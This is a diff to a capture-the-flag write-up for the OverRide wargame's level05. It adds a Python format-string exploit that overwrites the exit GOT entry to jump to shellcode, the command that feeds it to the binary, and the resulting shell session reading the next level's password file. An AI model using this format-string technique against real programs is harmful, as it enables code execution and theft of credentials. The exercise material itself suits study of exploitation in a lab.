@@ -178,7 +178,32 @@ level05@OverRide:~$ cat /tmp/pyload
 level05@OverRide:~$ (cat /tmp/pyload; cat) | ./level05 > /dev/null
 ```
 
+more organized syntax
 
+```
+import struct
+
+shell_addr = 0xffffdea0
+
+exit_addr = struct.pack ("I", 0x80497e0)
+exit_addr += struct.pack ("I", 0x80497e0 + 2)
+
+shell_msb = shell_addr >> 16
+shell_lsb = shell_addr & 0xffff
+
+
+print exit_addr  + "%" + str(shell_lsb - 8) + "d%10$hn" + "%" + str(shell_msb - shell_lsb) + "d%11$hn"
+```
+
+```
+python /tmp/pyload.py > /tmp/pyload
+
+level05@OverRide:~$ (cat /tmp/pyload; cat) | ./level05 > /dev/null
+pwd 1>&2
+/home/users/level05
+cat /home/users/level06/.pass 1>&2
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+```
 
 ```
 shell = 0xabcdef90
@@ -205,6 +230,22 @@ new_addr = masked_addr | new_msb
 
 print("masked = " + hex(masked_addr))
 print("new    = " + hex(new_addr))
+
+
+
+
+level05@OverRide:~$ python /tmp/pay.py
+shell = 0xabcdef90
+addr  = 0x12345678
+---------------
+
+masked = 0x5678
+new    = 0xef905678
+----------------
+
+masked = 0xef900000
+new    = 0xef90ef90
+
 ```
 
 
